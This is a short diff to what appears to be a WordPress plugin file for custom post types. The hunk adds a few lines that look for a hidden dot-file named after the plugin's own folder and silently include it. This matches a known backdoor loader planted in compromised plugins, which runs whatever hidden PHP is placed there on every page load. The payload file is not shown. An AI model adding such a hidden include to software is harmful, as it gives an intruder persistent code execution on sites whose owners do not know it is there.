@@ -23,6 +23,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @internal
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cptui_support_enqueue_scripts() {
 
 	$current_screen = get_current_screen();
